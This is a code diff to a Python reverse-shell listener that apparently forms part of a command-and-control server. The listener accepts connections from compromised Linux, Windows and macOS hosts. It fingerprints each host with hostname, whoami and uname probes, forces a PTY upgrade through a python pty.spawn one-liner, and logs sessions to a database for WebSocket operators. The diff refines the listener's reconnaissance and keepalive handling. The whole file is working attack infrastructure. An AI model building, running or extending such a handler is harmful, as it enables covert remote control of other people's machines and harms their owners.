@@ -190,7 +190,14 @@ class ShellListener:
         """Handle a new reverse shell connection."""
         ip, port = addr
         print(f"[+] New connection from {ip}:{port}")
-        
+
+        # Enable TCP-level keepalive so the OS detects dead connections
+        # without us sending application-level commands.
+        try:
+            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        except OSError:
+            pass
+
         shell_id = None
         try:
             with self.app.app_context():
@@ -198,10 +205,7 @@ class ShellListener:
                 # This supports all shell types: Linux bash/sh, Windows
                 # cmd/PowerShell, macOS zsh, Python/PHP/Ruby/Java shells,
                 # netcat, Invoke-Expression loops, and any other reverse
-                # shell payload.  We no longer reject silent connections
-                # because many Windows payloads (e.g. PowerShell
-                # Invoke-Expression loops) never send a banner and only
-                # respond once a command is submitted.
+                # shell payload.
 
                 initial_banner = b""
                 try:
@@ -210,183 +214,125 @@ class ShellListener:
                 except (socket.timeout, OSError):
                     pass
 
-                # Optionally probe for echo — purely informational, never
-                # used to reject.
-                if not initial_banner:
-                    try:
-                        conn.sendall(b'echo SHELL_OK\r\n')
-                        time.sleep(2)
-                        conn.settimeout(5)
-                        initial_banner = conn.recv(4096)
-                    except (socket.timeout, OSError):
-                        pass
-                
-                # Try to get system info
+                # Detect platform early from the banner — if the shell
+                # sent something that looks like Windows, we skip Unix
+                # probes entirely to avoid confusing the shell.
+                banner_text = initial_banner.decode('utf-8', errors='replace') if initial_banner else ''
+                win_indicators = ['Windows', 'Microsoft', 'MINGW', 'MSYS',
+                                  'CYGWIN', 'PowerShell', 'PS C:\\', 'C:\\']
+                detected_windows = any(w in banner_text for w in win_indicators)
+
+                hostname = f"host-{ip}"
+                platform = "Windows" if detected_windows else "Unknown"
+                shell_user = "unknown"
+
+                # --- Lightweight info gathering ---
+                # Only attempt ONE probe command per field.  Each probe
+                # waits at most 3 s for a response.  If the shell doesn't
+                # respond we simply keep defaults — this prevents
+                # overwhelming slow / PowerShell shells with a burst of
+                # commands.
                 try:
-                    # Send info gathering commands
-                    hostname = ""
-                    platform = ""
-                    shell_user = ""
-                    default_hostname = f"host-{ip}"
-                    
-                    # Use unique random markers to extract clean output
                     marker_id = secrets.token_hex(4)
-                    marker_start = f"C2S{marker_id}"
-                    marker_end = f"C2E{marker_id}"
-                    
-                    def _extract_output(raw: str, marker_s: str, marker_e: str) -> str:
-                        """Extract output between markers, falling back to cleaning."""
-                        # Use rfind to skip the echoed command line and find
-                        # the actual marker output lines.
-                        s_idx = raw.rfind(marker_s)
-                        e_idx = raw.rfind(marker_e)
-                        if s_idx >= 0 and e_idx > s_idx:
-                            extracted = raw[s_idx + len(marker_s):e_idx].strip()
-                            # The extracted text may still contain echoed commands
-                            # or prompt fragments. Keep only clean result lines.
-                            lines = [l.strip() for l in extracted.split('\n') if l.strip()]
-                            clean = []
-                            for line in lines:
-                                if marker_s in line or marker_e in line:
-                                    continue
-                                clean.append(line)
-                            return clean[0] if clean else ""
-                        # Fallback: clean the raw output
+                    ms = f"C2S{marker_id}"
+                    me = f"C2E{marker_id}"
+
+                    def _extract(raw: str) -> str:
+                        s = raw.rfind(ms)
+                        e = raw.rfind(me)
+                        if s >= 0 and e > s:
+                            block = raw[s + len(ms):e].strip()
+                            lines = [l.strip() for l in block.split('\n')
+                                     if l.strip() and ms not in l and me not in l]
+                            return lines[0] if lines else ""
                         cleaned = clean_shell_output(raw).strip()
                         lines = [l for l in cleaned.split('\n') if l.strip()]
                         return lines[-1].strip() if lines else ""
-                    
-                    def _send_and_recv(cmd_str: str, wait: float = 1.0) -> str:
-                        """Send a command and receive output.
 
-                        Args:
-                            cmd_str: The shell command to send (should end with newline).
-                            wait: Seconds to wait after sending before reading. Increase
-                                  for slow connections or complex commands.
-                        """
-                        # Drain any leftover data first
+                    def _probe(cmd: str, wait: float = 1.5) -> str:
+                        """Send a single probe and return the output."""
+                        # Drain stale data
                         conn.settimeout(0.3)
                         try:
-                            while True:
-                                d = conn.recv(4096)
-                                if not d:
-                                    break
+                            while conn.recv(4096):
+                                pass
                         except (socket.timeout, OSError):
                             pass
-
-                        conn.sendall(cmd_str.encode('utf-8'))
+                        conn.sendall(cmd.encode('utf-8'))
                         time.sleep(wait)
-                        chunks = b""
-                        conn.settimeout(2)
+                        buf = b""
+                        conn.settimeout(3)
                         try:
                             while True:
                                 chunk = conn.recv(4096)
                                 if not chunk:
                                     break
-                                chunks += chunk
-                        except socket.timeout:
+                                buf += chunk
+                        except (socket.timeout, OSError):
                             pass
-                        except Exception:
-                            pass
-                        return chunks.decode('utf-8', errors='replace')
+                        return buf.decode('utf-8', errors='replace')
 
-                    # Info gathering: use echo markers with ; which works on
-                    # bash/sh, PowerShell, and cmd.exe (via &).  We use ;
-                    # because PowerShell doesn't support && in older versions.
-                    # The `hostname` and `whoami` commands exist on all major
-                    # platforms.
-                    hostname_cmd = f'echo {marker_start}; hostname; echo {marker_end}\n'
-                    hostname_raw = _send_and_recv(hostname_cmd)
-                    hostname = _extract_output(hostname_raw, marker_start, marker_end)
-                    if not hostname or hostname == "unknown":
-                        hostname = default_hostname
+                    # hostname — works on both Unix and Windows
+                    raw = _probe(f'echo {ms}; hostname; echo {me}\n')
+                    h = _extract(raw)
+                    if h:
+                        hostname = h
 
-                    # whoami exists on both Unix and Windows.  Fall back to
-                    # %USERNAME% on Windows if whoami is missing.
-                    user_cmd = f'echo {marker_start}; whoami; echo {marker_end}\n'
-                    shell_user_raw = _send_and_recv(user_cmd)
-                    shell_user = _extract_output(shell_user_raw, marker_start, marker_end)
-                    if not shell_user or shell_user == "unknown":
-                        # Fallback for Windows without whoami
-                        fallback_cmd = f'echo {marker_start}; echo %USERNAME%; echo {marker_end}\n'
-                        fb_raw = _send_and_recv(fallback_cmd)
-                        fb = _extract_output(fb_raw, marker_start, marker_end)
-                        if fb and fb != '%USERNAME%':
-                            shell_user = fb
-                        else:
-                            shell_user = "unknown"
+                    # whoami
+                    raw = _probe(f'echo {ms}; whoami; echo {me}\n')
+                    u = _extract(raw)
+                    if u:
+                        shell_user = u
 
-                    # OS detection: check the initial banner first, then probe.
-                    banner_text = initial_banner.decode('utf-8', errors='replace') if initial_banner else ''
-                    win_indicators = ['Windows', 'Microsoft', 'MINGW', 'MSYS', 'CYGWIN', 'PowerShell', 'PS C:\\', 'C:\\']
-                    if any(w in banner_text for w in win_indicators):
-                        platform = 'Windows'
-                    else:
-                        os_cmd = f'echo {marker_start}; uname -s; echo {marker_end}\n'
-                        os_info_raw = _send_and_recv(os_cmd)
-                        os_info = _extract_output(os_info_raw, marker_start, marker_end)
-                        os_info_full = os_info_raw
-                        if 'Linux' in os_info or 'Linux' in os_info_full:
+                    # OS detection (only if not already detected from banner)
+                    if not detected_windows:
+                        raw = _probe(f'echo {ms}; uname -s; echo {me}\n')
+                        if 'Linux' in raw:
                             platform = 'Linux'
-                        elif 'Darwin' in os_info or 'Darwin' in os_info_full:
+                        elif 'Darwin' in raw:
                             platform = 'macOS'
-                        elif any(w in os_info_full for w in win_indicators):
+                        elif any(w in raw for w in win_indicators):
                             platform = 'Windows'
                         else:
-                            # uname failed — try Windows 'ver'
-                            ver_cmd = f'echo {marker_start}; ver; echo {marker_end}\n'
-                            ver_raw = _send_and_recv(ver_cmd)
-                            if any(w in ver_raw for w in ['Windows', 'Microsoft']):
+                            raw2 = _probe(f'echo {ms}; ver; echo {me}\n')
+                            if any(w in raw2 for w in ['Windows', 'Microsoft']):
                                 platform = 'Windows'
-                            else:
-                                platform = 'Unknown'
 
-                    # Attempt PTY upgrade on Unix-like systems for a proper
-                    # interactive shell (colour, job control, etc.)
-                    # Skip for Windows shells where PTY upgrade doesn't apply.
-                    if platform != 'Windows':
-                        try:
-                            pty_cmd = (
-                                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
-                                "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
-                                "|| python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 2>/dev/null "
-                                "|| script -qc /bin/bash /dev/null 2>/dev/null "
-                                "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
-                            )
-                            conn.sendall(pty_cmd.encode('utf-8'))
-                            time.sleep(1)
-                            # Drain the PTY upgrade output
-                            conn.settimeout(2)
-                            try:
-                                while True:
-                                    d = conn.recv(4096)
-                                    if not d:
-                                        break
-                            except (socket.timeout, OSError):
-                                pass
-                            # Set a generous terminal size so full-screen
-                            # programs (top, htop, vim) render properly.
-                            try:
-                                conn.sendall(b'stty rows 50 cols 200 2>/dev/null; export TERM=xterm-256color\n')
-                                time.sleep(0.3)
-                                conn.settimeout(1)
-                                try:
-                                    conn.recv(4096)
-                                except (socket.timeout, OSError):
-                                    pass
-                            except OSError:
-                                pass
-                        except Exception:
-                            pass
-                        
                 except Exception:
-                    hostname = default_hostname
-                    platform = "Unknown"
-                    shell_user = "unknown"
-                
+                    pass  # keep defaults
+
+                # PTY upgrade — only for Unix-like systems
+                if platform not in ('Windows',):
+                    try:
+                        pty_cmd = (
+                            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
+                            "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
+                            "|| python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 2>/dev/null "
+                            "|| script -qc /bin/bash /dev/null 2>/dev/null "
+                            "|| script -qc /bin/sh /dev/null 2>/dev/null\n"
+                        )
+                        conn.sendall(pty_cmd.encode('utf-8'))
+                        time.sleep(1.5)
+                        conn.settimeout(2)
+                        try:
+                            while conn.recv(4096):
+                                pass
+                        except (socket.timeout, OSError):
+                            pass
+                        conn.sendall(b'stty rows 50 cols 200 2>/dev/null; export TERM=xterm-256color\n')
+                        time.sleep(0.5)
+                        conn.settimeout(1)
+                        try:
+                            conn.recv(4096)
+                        except (socket.timeout, OSError):
+                            pass
+                    except Exception:
+                        pass
+
                 # Create or update shell record – match by IP address only
-                # so that reconnections from the same host (which arrive on
-                # a different source port) reuse the existing record.
+                # so that reconnections from the same host reuse the
+                # existing record.
+                default_hostname = f"host-{ip}"
                 shell = ReverseShell.query.filter_by(address=ip).first()
                 if not shell:
                     session_id = secrets.token_urlsafe(16)
@@ -404,7 +350,6 @@ class ShellListener:
                     )
                     db.session.add(shell)
                 else:
-                    # Reuse existing record – update port and metadata
                     shell.port = port
                     if not shell.session_id:
                         shell.session_id = secrets.token_urlsafe(16)
@@ -419,17 +364,17 @@ class ShellListener:
                         shell.platform = platform
                     if shell_user and shell_user != "unknown":
                         shell.shell_user = shell_user
-                
+
                 db.session.commit()
                 shell_id = shell.id
-                
-                # Store connection
+
                 with self.lock:
-                    self.connections[shell_id] = ShellConnection(conn, addr, shell_id, platform=platform)
-                
+                    self.connections[shell_id] = ShellConnection(
+                        conn, addr, shell_id, platform=platform)
+
                 print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")
 
-                # Broadcast notification to all connected WebSocket clients
+                # Broadcast notification
                 try:
                     from app.extensions import socketio
                     socketio.emit("new_shell_connected", {
@@ -441,59 +386,43 @@ class ShellListener:
                     })
                 except Exception:
                     pass
-                
-                # Keep connection alive
+
+                # --- Keepalive loop ---
+                # We do NOT send commands for keepalive.  Instead we rely
+                # on TCP-level SO_KEEPALIVE (set above) and periodically
+                # attempt a non-destructive zero-byte peek on the socket.
+                # This avoids confusing PowerShell Invoke-Expression loops
+                # and other non-standard shells.
                 while self.is_running and self.connections.get(shell_id):
                     try:
-                        shell_conn = self.connections.get(shell_id)
-                        # When a WebSocket terminal is attached, skip keepalive
-                        # to avoid interfering with the real-time reader thread.
-                        if shell_conn and shell_conn.ws_attached:
-                            time.sleep(5)
-                            # Still update last_seen
-                            with self.app.app_context():
-                                shell_record = db.session.get(ReverseShell, shell_id)
-                                if shell_record:
-                                    shell_record.last_seen = datetime.utcnow()
-                                    db.session.commit()
-                            continue
+                        time.sleep(15)
 
-                        # Keepalive: send a no-op appropriate for the detected
-                        # platform.  On PowerShell, neither `true` nor `rem`
-                        # are valid — use an empty string expression instead.
-                        conn.settimeout(30)
-                        try:
-                            if platform == 'Windows':
-                                # PowerShell: `$null` is a valid no-op expression
-                                conn.sendall(b'$null\n')
-                            else:
-                                # Unix: `true` is a builtin that always succeeds
-                                conn.sendall(b'true\n')
-                        except (BrokenPipeError, ConnectionResetError, OSError, ConnectionAbortedError):
-                            print(f"[-] Keepalive failed for shell {shell_id} — connection broken")
+                        shell_conn = self.connections.get(shell_id)
+                        if not shell_conn or not shell_conn.is_active:
                             break
-                        # Drain the keepalive response so it doesn't
-                        # bleed into the next real command.
-                        time.sleep(0.3)
-                        conn.settimeout(0.5)
+
+                        # Check if the socket is still alive via non-blocking peek
                         try:
-                            while True:
-                                d = conn.recv(4096)
-                                if not d:
-                                    break
-                        except (socket.timeout, OSError):
+                            conn.settimeout(0)
+                            data = conn.recv(1, socket.MSG_PEEK)
+                            if data == b'':
+                                # Peer closed the connection
+                                print(f"[-] Shell {shell_id} — peer closed connection")
+                                break
+                        except BlockingIOError:
+                            # No data available — socket is alive (good)
                             pass
-                        time.sleep(30)
-                        
+                        except (ConnectionResetError, BrokenPipeError,
+                                ConnectionAbortedError, OSError):
+                            print(f"[-] Keepalive check failed for shell {shell_id}")
+                            break
+
                         # Update last_seen
                         with self.app.app_context():
                             shell_record = db.session.get(ReverseShell, shell_id)
                             if shell_record:
                                 shell_record.last_seen = datetime.utcnow()
                                 db.session.commit()
-                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
-                        print(f"[-] Shell {shell_id} connection reset")
-                        break
                     except Exception:
                         break
                         
